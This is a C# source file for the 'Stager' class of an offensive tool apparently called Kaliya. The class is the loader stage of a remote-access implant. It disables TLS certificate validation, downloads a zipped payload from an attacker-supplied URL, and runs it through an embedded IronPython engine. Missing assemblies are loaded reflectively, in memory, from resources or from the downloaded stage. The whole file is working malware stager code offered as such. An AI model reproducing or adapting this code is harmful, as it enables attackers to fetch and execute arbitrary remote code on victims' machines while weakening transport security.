using System;
using System.IO;
using System.IO.Compression;
using System.Reflection;
using System.Net;
using System.Runtime.InteropServices;
using Kaliya.Utils;

namespace Kaliya
{
    [ComVisible(true)]
    public static class Stager
    {
        private static ZipStorer _stage;

        static Stager()
        {
            ServicePointManager.ServerCertificateValidationCallback +=
                (sender, cert, chain, sslPolicyErrors) => true;
            ServicePointManager.SecurityProtocol = (SecurityProtocolType) 768 |
                                                   (SecurityProtocolType) 3072;
            ServicePointManager.Expect100Continue = false;

            AppDomain.CurrentDomain.AssemblyResolve += ResolveEventHandler;
        }

        public static void Run(string url)
        {
            var guid = Guid.NewGuid();
            var uri = new Uri(new Uri(url), guid.ToString());
#if DEBUG
            Console.WriteLine("[+] URL: {0}", uri);
#endif
            try
            {
#if DEBUG
                Console.WriteLine("[+] Trying to get the stage...");
#endif
                _stage = ZipStorer.Open(Core.DownloadStage(uri),
                    FileAccess.ReadWrite,
                    true);
            }
            catch
            {
#if DEBUG
                Console.WriteLine("\n\n[!] ERROR: Unable to get the stage.");
#endif
                Environment.Exit(-1);
            }
#if DEBUG
            Console.WriteLine("[+] Starting the Engine...");
#endif
            Engines.IronPython.Host.Run(uri, guid, _stage); //Magic!!
        }

        private static Assembly ResolveEventHandler(object sender, ResolveEventArgs args)
        {
            var dllName = Extras.GetDllName(args.Name);
#if DEBUG
            Console.WriteLine("\t[-] '{0}' was required...", dllName);
#endif
            byte[] bytes;
            try
            {
                bytes = Extras.GetResourceByName(dllName);
            }
            catch
            {
                bytes = Extras.GetResourceFromZip(_stage, dllName) ??
                        File.ReadAllBytes(RuntimeEnvironment.GetRuntimeDirectory() +
                                          dllName);
            }
#if DEBUG
            Console.WriteLine("\t[+] '{0}' loaded...", dllName);
#endif
            return Assembly.Load(bytes);
        }
    }
}